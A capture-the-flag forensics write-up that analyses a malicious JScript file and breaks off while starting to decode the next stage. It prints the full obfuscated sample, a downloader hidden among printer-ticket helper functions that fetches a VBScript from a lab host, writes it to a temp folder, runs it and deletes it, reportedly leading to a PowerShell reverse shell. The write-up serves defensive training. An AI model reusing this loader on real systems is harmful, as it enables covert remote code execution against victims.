#CHALLENGE NAME: One Step Closer
<br /><br /><br /><br />
"Tasked with defending the antidote's research, a diverse group of students united against a relentless cyber onslaught. As codes clashed and defenses were tested, their collective effort stood as humanity's beacon, inching closer to safeguarding the research for the cure with every thwarted attack. A stealthy attack might have penetrated their defenses. Along with the Hackster's University students, analyze the provided file so you can detect this attack in the future. <br /><br />
<br /><br /><br /><br />

Start with the javascript file.
<br />
After reading it and understanding that it connects to a URL to get a malicious code from it and executes it to get a reverse shell.

```
function b0ggJmxhfltbMChDZCVjRzogKz5oQVtST3g(T3Z1eFJaQWJAZ0R2, UHw6dEdFTENDZGJsMg, In4yInUlMHp0Uyo) {
    SetStandardNameSpaces(In4yInUlMHp0Uyo.XmlNode);
    var aUV9SGdocW83TjpAImFeWi1sOWA = getPrefixForNamespace(In4yInUlMHp0Uyo.XmlNode, iIxaSccVRaPCsnQAMPSaLszMbVuJdCKpmDnmtrqwBcHGAySufBgkUyoiqjtIUsuDAPocDpKQHPhwudAOvzZarRqsgQRUGtuhfNiMJhHjebvVbgBYtTmEUAwuFlSvGnYLyNEiLzdUDdYfFiqetXBfPSoYBGZAFBMkuYCLsnbQTOnRAgmyaYFdpjUcqtDdqBCdunNVzzuQ);
    if (aUV9SGdocW83TjpAImFeWi1sOWA != null) {
        var pdcParameterDefs = getParameterDefs(UHw6dEdFTENDZGJsMg);
        for (var defCount = 0; defCount < pdcParameterDefs.length; defCount++) {
            var paramString = T3Z1eFJaQWJAZ0R2.getString(pdcParameterDefs[defCount]);
            if (paramString != null && paramString.length > 0) {
                var paramName = aUV9SGdocW83TjpAImFeWi1sOWA + ":" + pdcParameterDefs[defCount];
                var currNode = In4yInUlMHp0Uyo.GetParameterInitializer(pdcParameterDefs[defCount], iIxaSccVRaPCsnQAMPSaLszMbVuJdCKpmDnmtrqwBcHGAySufBgkUyoiqjtIUsuDAPocDpKQHPhwudAOvzZarRqsgQRUGtuhfNiMJhHjebvVbgBYtTmEUAwuFlSvGnYLyNEiLzdUDdYfFiqetXBfPSoYBGZAFBMkuYCLsnbQTOnRAgmyaYFdpjUcqtDdqBCdunNVzzuQ)
                if (currNode == null) {
                    var ptRoot = In4yInUlMHp0Uyo.XmlNode.selectSingleNode("psf:PrintTicket");
                    var newParam = createProperty(paramName, "psf:ParameterInit", "xsd:string", paramString, In4yInUlMHp0Uyo);
                    ptRoot.appendChild(newParam);
                } else {
                    currNode.Value = paramString;
                }
            }
        }
    }
}

var lOLMCBgGDMolnlotrwOCsILGbKwBtzwvlYFqZdGLMqDxTrcBnpLiTUBqFfekJSDzoSURpLfjiRFSkUbDiScOejegcwcjNbnqGNXuTbtsxWGWvICjWnbUbbSrdUVFqffbkvjTgFhvQddrraBIrYWfNFerCZkSxFapZwPgmIRIyaedLHpBnOvnVBXwzWPxOQJgZModJeUo = new ActiveXObject("MSXML2.XMLHTTP.6.0");
var JzmzxutRESvvBNHRMgpQhJAmcuQNznBjwAbLtjLBPxoSGrvUCnwREryDvVBastJacHxICmpgOWJgUwSRXRwqAfFBpuXfuvQKeSHGMmiEVLNOXDrsiBQmKtBgrFvFnOEJvhaUPRsHWHJXFQABJnHSqYrABIaNvQjFElrbSrEIiGzCJnSHUlYQEbKNziGHlMlUiowWRPGw = new ActiveXObject("Scripting.FileSystemObject");
var CBZgIjkHfADIgnNwHIVgtNUBrjVWafHrRLSEDPUswrmjNaNRlTvDJdozVFfzVMHzjpdEoPlopkYPcunDXLgZbCcQToMaDqHieSCkYfzqatlzDRQLBtqFKLlIFmxbDebsFmXdhiHTvGzmMWEYMqzotmHetctmiYuMUuOQqaEEejfRnHyuiJAkwFYKwLrvfTVaxVzqMtWo = new ActiveXObject("WScript.Shell");
var AWgjPuudKWaufCdsGlXcfGBXlWzhGnugaLFEZJkXljTIiTlWxLziYRhZzkEFdwJZiyWUhBJhdaulcmVYllmbyxEpozeZhAVxCXClTUUNYngPYhWwTcyNovmwukeWsnLJLifhihpqYKHbzEQKIknuNqTCdJWSnzlEIEhoNPhzhAXLCkxsMeeRXRsGrNCeOSIcnFkMnhoj = 'C:\\Windows\\Temp';
var iQXNrUYfNRSDeYTqnnkAIHwOoiXzYicXoPIsDDsvvMnUvRWDdAoPhJQODSZHHiYLhONKLMuCrHuXfnbBOfSXYQRqtlzvJanjlYDvJPkIZzBBxzIPXbVvzIiVfxtXKEUaPQjQShbHdYcntUkfCfqOYGuzAbsGwzJAUvAZLujabnpPtDdTlZeepJmpUIpLJifXCeTPLhbiName = JzmzxutRESvvBNHRMgpQhJAmcuQNznBjwAbLtjLBPxoSGrvUCnwREryDvVBastJacHxICmpgOWJgUwSRXRwqAfFBpuXfuvQKeSHGMmiEVLNOXDrsiBQmKtBgrFvFnOEJvhaUPRsHWHJXFQABJnHSqYrABIaNvQjFElrbSrEIiGzCJnSHUlYQEbKNziGHlMlUiowWRPGw.GetTempName() + ".vbs"; 
var iQXNrUYfNRSDeYTqnnkAIHwOoiXzYicXoPIsDDsvvMnUvRWDdAoPhJQODSZHHiYLhONKLMuCrHuXfnbBOfSXYQRqtlzvJanjlYDvJPkIZzBBxzIPXbVvzIiVfxtXKEUaPQjQShbHdYcntUkfCfqOYGuzAbsGwzJAUvAZLujabnpPtDdTlZeepJmpUIpLJifXCeTPLhbi = JzmzxutRESvvBNHRMgpQhJAmcuQNznBjwAbLtjLBPxoSGrvUCnwREryDvVBastJacHxICmpgOWJgUwSRXRwqAfFBpuXfuvQKeSHGMmiEVLNOXDrsiBQmKtBgrFvFnOEJvhaUPRsHWHJXFQABJnHSqYrABIaNvQjFElrbSrEIiGzCJnSHUlYQEbKNziGHlMlUiowWRPGw.BuildPath(AWgjPuudKWaufCdsGlXcfGBXlWzhGnugaLFEZJkXljTIiTlWxLziYRhZzkEFdwJZiyWUhBJhdaulcmVYllmbyxEpozeZhAVxCXClTUUNYngPYhWwTcyNovmwukeWsnLJLifhihpqYKHbzEQKIknuNqTCdJWSnzlEIEhoNPhzhAXLCkxsMeeRXRsGrNCeOSIcnFkMnhoj, iQXNrUYfNRSDeYTqnnkAIHwOoiXzYicXoPIsDDsvvMnUvRWDdAoPhJQODSZHHiYLhONKLMuCrHuXfnbBOfSXYQRqtlzvJanjlYDvJPkIZzBBxzIPXbVvzIiVfxtXKEUaPQjQShbHdYcntUkfCfqOYGuzAbsGwzJAUvAZLujabnpPtDdTlZeepJmpUIpLJifXCeTPLhbiName);
lOLMCBgGDMolnlotrwOCsILGbKwBtzwvlYFqZdGLMqDxTrcBnpLiTUBqFfekJSDzoSURpLfjiRFSkUbDiScOejegcwcjNbnqGNXuTbtsxWGWvICjWnbUbbSrdUVFqffbkvjTgFhvQddrraBIrYWfNFerCZkSxFapZwPgmIRIyaedLHpBnOvnVBXwzWPxOQJgZModJeUo.open("GET", "http://infected.human.htb/d/BKtQR", false);
lOLMCBgGDMolnlotrwOCsILGbKwBtzwvlYFqZdGLMqDxTrcBnpLiTUBqFfekJSDzoSURpLfjiRFSkUbDiScOejegcwcjNbnqGNXuTbtsxWGWvICjWnbUbbSrdUVFqffbkvjTgFhvQddrraBIrYWfNFerCZkSxFapZwPgmIRIyaedLHpBnOvnVBXwzWPxOQJgZModJeUo.send();

if (lOLMCBgGDMolnlotrwOCsILGbKwBtzwvlYFqZdGLMqDxTrcBnpLiTUBqFfekJSDzoSURpLfjiRFSkUbDiScOejegcwcjNbnqGNXuTbtsxWGWvICjWnbUbbSrdUVFqffbkvjTgFhvQddrraBIrYWfNFerCZkSxFapZwPgmIRIyaedLHpBnOvnVBXwzWPxOQJgZModJeUo.status === 200) {
    var scriptText = lOLMCBgGDMolnlotrwOCsILGbKwBtzwvlYFqZdGLMqDxTrcBnpLiTUBqFfekJSDzoSURpLfjiRFSkUbDiScOejegcwcjNbnqGNXuTbtsxWGWvICjWnbUbbSrdUVFqffbkvjTgFhvQddrraBIrYWfNFerCZkSxFapZwPgmIRIyaedLHpBnOvnVBXwzWPxOQJgZModJeUo.responseText;
    var niyXKljCzNIENaWUxwYBODsAbUBFKCJJDbfyisBKTJpULtjrXSJIFBuGWkcmuhgDVdoSEMJPHvMzQiawcsBNhsfKbJlyQjzKLgnECDbAprhNSnXpNJwbwMQZWzJFAaxCQavQsDuRRIYXARrTgOjQgNHKgerFZvrghSUylvwuvszeCUHWvaOxTjgJDUzNCjCHYBnfbGOX = JzmzxutRESvvBNHRMgpQhJAmcuQNznBjwAbLtjLBPxoSGrvUCnwREryDvVBastJacHxICmpgOWJgUwSRXRwqAfFBpuXfuvQKeSHGMmiEVLNOXDrsiBQmKtBgrFvFnOEJvhaUPRsHWHJXFQABJnHSqYrABIaNvQjFElrbSrEIiGzCJnSHUlYQEbKNziGHlMlUiowWRPGw.CreateTextFile(iQXNrUYfNRSDeYTqnnkAIHwOoiXzYicXoPIsDDsvvMnUvRWDdAoPhJQODSZHHiYLhONKLMuCrHuXfnbBOfSXYQRqtlzvJanjlYDvJPkIZzBBxzIPXbVvzIiVfxtXKEUaPQjQShbHdYcntUkfCfqOYGuzAbsGwzJAUvAZLujabnpPtDdTlZeepJmpUIpLJifXCeTPLhbi, true);
    niyXKljCzNIENaWUxwYBODsAbUBFKCJJDbfyisBKTJpULtjrXSJIFBuGWkcmuhgDVdoSEMJPHvMzQiawcsBNhsfKbJlyQjzKLgnECDbAprhNSnXpNJwbwMQZWzJFAaxCQavQsDuRRIYXARrTgOjQgNHKgerFZvrghSUylvwuvszeCUHWvaOxTjgJDUzNCjCHYBnfbGOX.write(scriptText);
    niyXKljCzNIENaWUxwYBODsAbUBFKCJJDbfyisBKTJpULtjrXSJIFBuGWkcmuhgDVdoSEMJPHvMzQiawcsBNhsfKbJlyQjzKLgnECDbAprhNSnXpNJwbwMQZWzJFAaxCQavQsDuRRIYXARrTgOjQgNHKgerFZvrghSUylvwuvszeCUHWvaOxTjgJDUzNCjCHYBnfbGOX.close();
    var kFDpRbkGYzMjxpDvpsBUmWdRZQYKzHzicYnHeVAsyBErEExScslrucqNQomSurYvoaVCTILMrbSKgXeYCBiPqVYDhrOfNUdYGDYmDMHXaJRqZfRmNBivjAFdHQctMgOOYTbLIzTfMwiDriqYXdfJORQtnVlwEfumyikULcvhUBQOztBlzheoLivROSUFkYoEgWpzuyVe = CBZgIjkHfADIgnNwHIVgtNUBrjVWafHrRLSEDPUswrmjNaNRlTvDJdozVFfzVMHzjpdEoPlopkYPcunDXLgZbCcQToMaDqHieSCkYfzqatlzDRQLBtqFKLlIFmxbDebsFmXdhiHTvGzmMWEYMqzotmHetctmiYuMUuOQqaEEejfRnHyuiJAkwFYKwLrvfTVaxVzqMtWo.Exec('wscript "' + iQXNrUYfNRSDeYTqnnkAIHwOoiXzYicXoPIsDDsvvMnUvRWDdAoPhJQODSZHHiYLhONKLMuCrHuXfnbBOfSXYQRqtlzvJanjlYDvJPkIZzBBxzIPXbVvzIiVfxtXKEUaPQjQShbHdYcntUkfCfqOYGuzAbsGwzJAUvAZLujabnpPtDdTlZeepJmpUIpLJifXCeTPLhbi + '"');
    while (kFDpRbkGYzMjxpDvpsBUmWdRZQYKzHzicYnHeVAsyBErEExScslrucqNQomSurYvoaVCTILMrbSKgXeYCBiPqVYDhrOfNUdYGDYmDMHXaJRqZfRmNBivjAFdHQctMgOOYTbLIzTfMwiDriqYXdfJORQtnVlwEfumyikULcvhUBQOztBlzheoLivROSUFkYoEgWpzuyVe.Status === 0) {
        WScript.Sleep(100);
    }
    JzmzxutRESvvBNHRMgpQhJAmcuQNznBjwAbLtjLBPxoSGrvUCnwREryDvVBastJacHxICmpgOWJgUwSRXRwqAfFBpuXfuvQKeSHGMmiEVLNOXDrsiBQmKtBgrFvFnOEJvhaUPRsHWHJXFQABJnHSqYrABIaNvQjFElrbSrEIiGzCJnSHUlYQEbKNziGHlMlUiowWRPGw.DeleteFile(iQXNrUYfNRSDeYTqnnkAIHwOoiXzYicXoPIsDDsvvMnUvRWDdAoPhJQODSZHHiYLhONKLMuCrHuXfnbBOfSXYQRqtlzvJanjlYDvJPkIZzBBxzIPXbVvzIiVfxtXKEUaPQjQShbHdYcntUkfCfqOYGuzAbsGwzJAUvAZLujabnpPtDdTlZeepJmpUIpLJifXCeTPLhbi);

} else {
    WScript.Echo("Fatal: " + lOLMCBgGDMolnlotrwOCsILGbKwBtzwvlYFqZdGLMqDxTrcBnpLiTUBqFfekJSDzoSURpLfjiRFSkUbDiScOejegcwcjNbnqGNXuTbtsxWGWvICjWnbUbbSrdUVFqffbkvjTgFhvQddrraBIrYWfNFerCZkSxFapZwPgmIRIyaedLHpBnOvnVBXwzWPxOQJgZModJeUo.status);
}


function xxzICTEWUoZJBJKxzXZbbVSdcJZwpWdrOlNipimSCjHVGPbNIQmESWNdTqMEDUAvKRNqmroqETSTepIlqrGYbzqORBboJyIQldbCGgBJyMxvBBcmaCgiHqHiHCAqzXdbLbcNWQYwahvPUXRivRmbqhBxETFNBupQRezBVHBgIbWOunyFCILIiLvBNnGKhXSJgzGTHZQw(In4yInUlMHp0Uyo, UHw6dEdFTENDZGJsMg, T3Z1eFJaQWJAZ0R2) {
    SetStandardNameSpaces(In4yInUlMHp0Uyo.XmlNode);
    var aUV9SGdocW83TjpAImFeWi1sOWA = getPrefixForNamespace(In4yInUlMHp0Uyo.XmlNode, iIxaSccVRaPCsnQAMPSaLszMbVuJdCKpmDnmtrqwBcHGAySufBgkUyoiqjtIUsuDAPocDpKQHPhwudAOvzZarRqsgQRUGtuhfNiMJhHjebvVbgBYtTmEUAwuFlSvGnYLyNEiLzdUDdYfFiqetXBfPSoYBGZAFBMkuYCLsnbQTOnRAgmyaYFdpjUcqtDdqBCdunNVzzuQ);
    if (aUV9SGdocW83TjpAImFeWi1sOWA != null) {
        var pdcParameterDefs = getParameterDefs(UHw6dEdFTENDZGJsMg);
        for (var defCount = 0; defCount < pdcParameterDefs.length; defCount++) {
            var currNode = In4yInUlMHp0Uyo.GetParameterInitializer(pdcParameterDefs[defCount], iIxaSccVRaPCsnQAMPSaLszMbVuJdCKpmDnmtrqwBcHGAySufBgkUyoiqjtIUsuDAPocDpKQHPhwudAOvzZarRqsgQRUGtuhfNiMJhHjebvVbgBYtTmEUAwuFlSvGnYLyNEiLzdUDdYfFiqetXBfPSoYBGZAFBMkuYCLsnbQTOnRAgmyaYFdpjUcqtDdqBCdunNVzzuQ)
            if (currNode != null) {
                T3Z1eFJaQWJAZ0R2.setString(pdcParameterDefs[defCount], currNode.Value);
            }
        }
    }
}
```

But what is the malicious code?
Now I connect to the IP that is given on THB, and I use it to get the URL.

![Alt text](./get_url.png "GET_url")

I will get the code, but it is very long output. So, lets save the output on a text file.

![Alt text](./get_url_save_output.png "GET_url and save the output on a text file")

It is a VBScript code contains a lot of string manipulation. At the end of the code, it run PowerShell command.
In PowerShell, the -Command parameter is used to specify a command that PowerShell should execute.

![Alt text](./run_command.png "Run command")




So, I want to know the content of this string "tomqOX........."





